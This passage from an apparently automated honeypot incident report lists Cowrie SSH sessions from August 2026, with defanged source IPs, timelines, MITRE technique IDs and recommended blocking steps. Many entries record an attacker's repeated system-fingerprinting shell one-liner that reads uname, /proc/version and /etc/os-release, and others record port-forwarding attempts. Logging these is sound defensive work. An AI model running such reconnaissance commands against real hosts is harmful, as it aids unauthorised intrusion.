| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:58:11` | `cowrie.session.connect` |
| `2026-08-23 19:58:11` | `cowrie.client.version` |
| `2026-08-23 19:58:11` | `cowrie.client.kex` |
| `2026-08-23 19:58:12` | `cowrie.login.success` |
| `2026-08-23 19:58:14` | `cowrie.session.params` |
| `2026-08-23 19:58:14` | `cowrie.command.input` |
| `2026-08-23 19:58:14` | `cowrie.command.input` |
| `2026-08-23 19:58:14` | `cowrie.command.input` |
| `2026-08-23 19:58:14` | `cowrie.command.input` |
| `2026-08-23 19:58:14` | `cowrie.command.input` |
| `2026-08-23 19:58:14` | `cowrie.command.success` |
| `2026-08-23 19:58:14` | `cowrie.command.input` |
| `2026-08-23 19:58:14` | `cowrie.command.input` |
| `2026-08-23 19:58:14` | `cowrie.command.input` |
| `2026-08-23 19:58:14` | `cowrie.command.input` |
| `2026-08-23 19:58:14` | `cowrie.log.closed` |
| `2026-08-23 19:58:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b8724265494

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:59 |
| **Last Seen** | 2026-08-23 19:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:59:56` | `cowrie.session.connect` |
| `2026-08-23 19:59:56` | `cowrie.client.version` |
| `2026-08-23 19:59:56` | `cowrie.client.kex` |
| `2026-08-23 19:59:57` | `cowrie.login.success` |
| `2026-08-23 19:59:58` | `cowrie.session.params` |
| `2026-08-23 19:59:58` | `cowrie.command.input` |
| `2026-08-23 19:59:58` | `cowrie.command.input` |
| `2026-08-23 19:59:58` | `cowrie.command.input` |
| `2026-08-23 19:59:58` | `cowrie.command.input` |
| `2026-08-23 19:59:58` | `cowrie.command.input` |
| `2026-08-23 19:59:58` | `cowrie.command.success` |
| `2026-08-23 19:59:58` | `cowrie.command.input` |
| `2026-08-23 19:59:58` | `cowrie.command.input` |
| `2026-08-23 19:59:58` | `cowrie.command.input` |
| `2026-08-23 19:59:58` | `cowrie.command.input` |
| `2026-08-23 19:59:59` | `cowrie.log.closed` |
| `2026-08-23 19:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-260a903ed53b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 20:01 |
| **Last Seen** | 2026-08-23 20:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:01:42` | `cowrie.session.connect` |
| `2026-08-23 20:01:42` | `cowrie.client.version` |
| `2026-08-23 20:01:42` | `cowrie.client.kex` |
| `2026-08-23 20:01:44` | `cowrie.login.success` |
| `2026-08-23 20:01:45` | `cowrie.session.params` |
| `2026-08-23 20:01:45` | `cowrie.command.input` |
| `2026-08-23 20:01:45` | `cowrie.command.input` |
| `2026-08-23 20:01:45` | `cowrie.command.input` |
| `2026-08-23 20:01:45` | `cowrie.command.input` |
| `2026-08-23 20:01:45` | `cowrie.command.input` |
| `2026-08-23 20:01:45` | `cowrie.command.success` |
| `2026-08-23 20:01:45` | `cowrie.command.input` |
| `2026-08-23 20:01:45` | `cowrie.command.input` |
| `2026-08-23 20:01:45` | `cowrie.command.input` |
| `2026-08-23 20:01:45` | `cowrie.command.input` |
| `2026-08-23 20:01:45` | `cowrie.log.closed` |
| `2026-08-23 20:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03f332057554

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 20:03 |
| **Last Seen** | 2026-08-23 20:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:03:24` | `cowrie.session.connect` |
| `2026-08-23 20:03:24` | `cowrie.client.version` |
| `2026-08-23 20:03:24` | `cowrie.client.kex` |
| `2026-08-23 20:03:26` | `cowrie.login.success` |
| `2026-08-23 20:03:27` | `cowrie.session.params` |
| `2026-08-23 20:03:27` | `cowrie.command.input` |
| `2026-08-23 20:03:27` | `cowrie.command.input` |
| `2026-08-23 20:03:27` | `cowrie.command.input` |
| `2026-08-23 20:03:27` | `cowrie.command.input` |
| `2026-08-23 20:03:27` | `cowrie.command.input` |
| `2026-08-23 20:03:27` | `cowrie.command.success` |
| `2026-08-23 20:03:27` | `cowrie.command.input` |
| `2026-08-23 20:03:27` | `cowrie.command.input` |
| `2026-08-23 20:03:27` | `cowrie.command.input` |
| `2026-08-23 20:03:27` | `cowrie.command.input` |
| `2026-08-23 20:03:28` | `cowrie.log.closed` |
| `2026-08-23 20:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee4757ae4f47

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 20:05 |
| **Last Seen** | 2026-08-23 20:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:05:06` | `cowrie.session.connect` |
| `2026-08-23 20:05:06` | `cowrie.client.version` |
| `2026-08-23 20:05:07` | `cowrie.client.kex` |
| `2026-08-23 20:05:08` | `cowrie.login.success` |
| `2026-08-23 20:05:10` | `cowrie.session.params` |
| `2026-08-23 20:05:10` | `cowrie.command.input` |
| `2026-08-23 20:05:10` | `cowrie.command.input` |
| `2026-08-23 20:05:10` | `cowrie.command.input` |
| `2026-08-23 20:05:10` | `cowrie.command.input` |
| `2026-08-23 20:05:10` | `cowrie.command.input` |
| `2026-08-23 20:05:10` | `cowrie.command.success` |
| `2026-08-23 20:05:10` | `cowrie.command.input` |
| `2026-08-23 20:05:10` | `cowrie.command.input` |
| `2026-08-23 20:05:10` | `cowrie.command.input` |
| `2026-08-23 20:05:10` | `cowrie.command.input` |
| `2026-08-23 20:05:10` | `cowrie.log.closed` |
| `2026-08-23 20:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7870e44c2e1e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 20:06 |
| **Last Seen** | 2026-08-23 20:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:06:50` | `cowrie.session.connect` |
| `2026-08-23 20:06:50` | `cowrie.client.version` |
| `2026-08-23 20:06:50` | `cowrie.client.kex` |
| `2026-08-23 20:06:51` | `cowrie.login.success` |
| `2026-08-23 20:06:53` | `cowrie.session.params` |
| `2026-08-23 20:06:53` | `cowrie.command.input` |
| `2026-08-23 20:06:53` | `cowrie.command.input` |
| `2026-08-23 20:06:53` | `cowrie.command.input` |
| `2026-08-23 20:06:53` | `cowrie.command.input` |
| `2026-08-23 20:06:53` | `cowrie.command.input` |
| `2026-08-23 20:06:53` | `cowrie.command.success` |
| `2026-08-23 20:06:53` | `cowrie.command.input` |
| `2026-08-23 20:06:53` | `cowrie.command.input` |
| `2026-08-23 20:06:53` | `cowrie.command.input` |
| `2026-08-23 20:06:53` | `cowrie.command.input` |
| `2026-08-23 20:06:53` | `cowrie.log.closed` |
| `2026-08-23 20:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92a4e0c371a8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 20:07 |
| **Last Seen** | 2026-08-23 20:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:07:30` | `cowrie.session.connect` |
| `2026-08-23 20:07:30` | `cowrie.client.version` |
| `2026-08-23 20:07:30` | `cowrie.client.kex` |
| `2026-08-23 20:07:31` | `cowrie.login.success` |
| `2026-08-23 20:07:31` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:07:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 20:07:31` | `cowrie.direct-tcpip.data` |
| `2026-08-23 20:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4030d15744a5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 20:07 |
| **Last Seen** | 2026-08-23 20:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:07:34` | `cowrie.session.connect` |
| `2026-08-23 20:07:34` | `cowrie.client.version` |
| `2026-08-23 20:07:34` | `cowrie.client.kex` |
| `2026-08-23 20:07:35` | `cowrie.login.success` |
| `2026-08-23 20:07:35` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:07:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 20:07:35` | `cowrie.direct-tcpip.data` |
| `2026-08-23 20:07:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f0a23b710e8

| Field | Detail |
|---|---|
| **Source IP** | `65.20.158[.]10` |
| **First Seen** | 2026-08-23 20:07 |
| **Last Seen** | 2026-08-23 20:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:07:49` | `cowrie.session.connect` |
| `2026-08-23 20:07:50` | `cowrie.client.version` |
| `2026-08-23 20:07:50` | `cowrie.client.kex` |
| `2026-08-23 20:07:51` | `cowrie.login.success` |
| `2026-08-23 20:07:52` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.158[.]10` to AbuseIPDB if not already reported
- [ ] Block `65.20.158[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-710b4d38b184

| Field | Detail |
|---|---|
| **Source IP** | `1.212.225[.]99` |
| **First Seen** | 2026-08-23 20:08 |
| **Last Seen** | 2026-08-23 20:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:08:02` | `cowrie.session.connect` |
| `2026-08-23 20:08:03` | `cowrie.client.version` |
| `2026-08-23 20:08:03` | `cowrie.client.kex` |
| `2026-08-23 20:08:04` | `cowrie.login.success` |
| `2026-08-23 20:08:05` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.212.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `1.212.225[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a16c49a6717c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 20:08 |
| **Last Seen** | 2026-08-23 20:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:08:34` | `cowrie.session.connect` |
| `2026-08-23 20:08:34` | `cowrie.client.version` |
| `2026-08-23 20:08:34` | `cowrie.client.kex` |
| `2026-08-23 20:08:36` | `cowrie.login.success` |
| `2026-08-23 20:08:37` | `cowrie.session.params` |
| `2026-08-23 20:08:37` | `cowrie.command.input` |
| `2026-08-23 20:08:37` | `cowrie.command.input` |
| `2026-08-23 20:08:37` | `cowrie.command.input` |
| `2026-08-23 20:08:37` | `cowrie.command.input` |
| `2026-08-23 20:08:37` | `cowrie.command.input` |
| `2026-08-23 20:08:37` | `cowrie.command.success` |
| `2026-08-23 20:08:37` | `cowrie.command.input` |
| `2026-08-23 20:08:37` | `cowrie.command.input` |
| `2026-08-23 20:08:37` | `cowrie.command.input` |
| `2026-08-23 20:08:37` | `cowrie.command.input` |
| `2026-08-23 20:08:38` | `cowrie.log.closed` |
| `2026-08-23 20:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65a6f1c62176

| Field | Detail |
|---|---|
| **Source IP** | `104.248.83[.]99` |
| **First Seen** | 2026-08-23 20:09 |
| **Last Seen** | 2026-08-23 20:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:09:05` | `cowrie.session.connect` |
| `2026-08-23 20:09:06` | `cowrie.client.version` |
| `2026-08-23 20:09:06` | `cowrie.client.kex` |
| `2026-08-23 20:09:06` | `cowrie.login.success` |
| `2026-08-23 20:09:07` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.248.83[.]99` to AbuseIPDB if not already reported
- [ ] Block `104.248.83[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8250e79ebdbd

| Field | Detail |
|---|---|
| **Source IP** | `62.97.214[.]11` |
| **First Seen** | 2026-08-23 20:09 |
| **Last Seen** | 2026-08-23 20:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:09:11` | `cowrie.session.connect` |
| `2026-08-23 20:09:12` | `cowrie.client.version` |
| `2026-08-23 20:09:12` | `cowrie.client.kex` |
| `2026-08-23 20:09:13` | `cowrie.login.success` |
| `2026-08-23 20:09:13` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:09:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.97.214[.]11` to AbuseIPDB if not already reported
- [ ] Block `62.97.214[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4104087708a5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 20:10 |
| **Last Seen** | 2026-08-23 20:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:10:20` | `cowrie.session.connect` |
| `2026-08-23 20:10:20` | `cowrie.client.version` |
| `2026-08-23 20:10:20` | `cowrie.client.kex` |
| `2026-08-23 20:10:21` | `cowrie.login.success` |
| `2026-08-23 20:10:22` | `cowrie.session.params` |
| `2026-08-23 20:10:22` | `cowrie.command.input` |
| `2026-08-23 20:10:22` | `cowrie.command.input` |
| `2026-08-23 20:10:22` | `cowrie.command.input` |
| `2026-08-23 20:10:22` | `cowrie.command.input` |
| `2026-08-23 20:10:22` | `cowrie.command.input` |
| `2026-08-23 20:10:22` | `cowrie.command.success` |
| `2026-08-23 20:10:22` | `cowrie.command.input` |
| `2026-08-23 20:10:22` | `cowrie.command.input` |
| `2026-08-23 20:10:22` | `cowrie.command.input` |
| `2026-08-23 20:10:22` | `cowrie.command.input` |
| `2026-08-23 20:10:23` | `cowrie.log.closed` |
| `2026-08-23 20:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e884aadb8819

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 20:12 |
| **Last Seen** | 2026-08-23 20:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:12:07` | `cowrie.session.connect` |
| `2026-08-23 20:12:07` | `cowrie.client.version` |
| `2026-08-23 20:12:07` | `cowrie.client.kex` |
| `2026-08-23 20:12:08` | `cowrie.login.success` |
| `2026-08-23 20:12:10` | `cowrie.session.params` |
| `2026-08-23 20:12:10` | `cowrie.command.input` |
| `2026-08-23 20:12:10` | `cowrie.command.input` |
| `2026-08-23 20:12:10` | `cowrie.command.input` |
| `2026-08-23 20:12:10` | `cowrie.command.input` |
| `2026-08-23 20:12:10` | `cowrie.command.input` |
| `2026-08-23 20:12:10` | `cowrie.command.success` |
| `2026-08-23 20:12:10` | `cowrie.command.input` |
| `2026-08-23 20:12:10` | `cowrie.command.input` |
| `2026-08-23 20:12:10` | `cowrie.command.input` |
| `2026-08-23 20:12:10` | `cowrie.command.input` |
| `2026-08-23 20:12:11` | `cowrie.log.closed` |
| `2026-08-23 20:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f0e6f84ecbd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 20:13 |
| **Last Seen** | 2026-08-23 20:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
